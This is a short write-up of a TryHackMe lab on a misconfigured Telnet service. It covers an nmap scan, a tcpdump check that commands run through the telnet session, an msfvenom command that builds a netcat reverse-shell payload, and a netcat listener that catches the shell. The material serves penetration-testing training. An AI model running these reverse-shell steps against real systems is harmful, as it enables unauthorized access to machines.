## TryHackMe Networking Services / Telnet Walkthrough

## OBjective 
Exploit a misconfigured telnet service to gain unauthorized access

## Tools Used
- Nmap
- Netcat
- Msfvenom

## Enumerating Telnet
1. Ran a port scan using nmap on the target machine and found open port 8012
- nmap -T4 -Pn -A -p- [IP}
2. As I looked around the scan I can conclude this port can be used for a backdoor belolonging to skidy

## Exploiting Telnet
1. Connected to Telnet with the following syntax
- telnet[IP] [port]
2. Created tcpdump listener, specifcally listening for icmp traffic on seperate terminal with the following command
- sudo tcpdump ip proto \\icmp -i ens5
3. Used command "ping [attacking machine IP] -c 1" through the telnet ssession to see if we're able to run system commands.
- ping recieved on tcpdump listener, which means commands are able to be executed.
4. Generated a reverse shell payload on seperate terminal using msfvenom with the following syntax, which encodes a netcat reverse shell
- msfvenom -p cmd/unix/reverse_netcat lhost=[local machine IP] lport=4444 R
5. Created netcat listener on local machine to set up payload for execution with this syntax
- nc -lvnp 4444
6. Copied and pasted msfvenom payload into the telnet session and ran it as a command (.RUN) and got the shell on target machine.
